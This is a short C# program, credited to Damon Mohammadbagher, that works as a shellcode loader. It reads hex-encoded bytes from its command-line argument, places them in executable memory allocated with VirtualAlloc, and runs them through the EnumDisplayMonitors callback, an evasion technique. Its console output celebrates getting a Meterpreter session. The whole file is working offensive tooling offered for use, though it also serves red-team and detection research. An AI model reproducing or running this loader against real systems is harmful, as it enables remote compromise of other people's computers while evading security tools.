using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;

namespace NativePayload_AsyncMEnumDisplayMonitors
{
    class Program
    {
        [Flags]
        public enum AllocationType
        {
            Commit = 0x00001000
        }

        [Flags]
        public enum MemoryProtection
        {
            ExecuteReadWrite = 0x0040
        }
        [DllImport("ntdll.dll")]
        private static extern bool RtlMoveMemory(IntPtr addr, byte[] pay, uint size);
        [DllImport("kernelbase.dll")]
        public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, AllocationType flAllocationType, MemoryProtection flProtect);
        [DllImport("user32.dll")]
        private static extern bool EnumDisplayMonitors(IntPtr hdc, IntPtr lprcClip, IntPtr lpfnEnum, uint dwData);
        [DllImport("user32.dll")]
        private static extern bool EnumDisplayMonitors(IntPtr hdc, IntPtr lprcClip, AsyncCallBack ops, uint dwData);

        public static string pay = "";
        public delegate void AsyncCallBack();
        public static void EnumDisplayMonitorsExecCode()
        {
            string[] X = pay.Split(',');
            byte[] Xpayload = new byte[X.Length];
            for (int i = 0; i < X.Length;) { Xpayload[i] = Convert.ToByte(X[i], 16); i++; }
            Console.WriteLine();
            IntPtr p = VirtualAlloc(IntPtr.Zero, (uint)Xpayload.Length, AllocationType.Commit, MemoryProtection.ExecuteReadWrite);
            Marshal.Copy(Xpayload, 0, p, Xpayload.Length);
            //RtlMoveMemory(p, Xpayload, (uint)Xpayload.Length);
            Console.WriteLine("[!] [" + DateTime.Now.ToString() + "]::VirtualAlloc.Result[" + p.ToString("X8") + "]");
            System.Threading.Thread.Sleep(5555);
            Console.WriteLine();
            Console.WriteLine("Bingo: Meterpreter Session via callback functions Technique by \"EnumDisplayMonitors + AsyncMethod\"  ;)");
            bool ok = EnumDisplayMonitors(IntPtr.Zero, IntPtr.Zero, p, 0x0);
        }
        static void Main(string[] args)
        {
            /// .Net 3.5 / 4.0 only ;)
            Console.WriteLine();
            Console.ForegroundColor = ConsoleColor.DarkGray;
            Console.WriteLine("NativePayload_AsyncMEnumDisplayMonitors , Published by Damon Mohammadbagher , Mar 2021");
            Console.ForegroundColor = ConsoleColor.Gray;
            Console.WriteLine("NativePayload_AsyncMEnumDisplayMonitors Callback Functions Technique via (EnumDisplayMonitors + AsyncMethod) API");
            Console.WriteLine();
            pay = args[0];
            AsyncCallBack CsharpMethod = new AsyncCallBack(EnumDisplayMonitorsExecCode);
            System.Threading.Thread.Sleep(5555);
            bool okAgain = EnumDisplayMonitors(IntPtr.Zero, IntPtr.Zero, CsharpMethod, 0x0);
            Console.ReadKey();
        }
    }
}
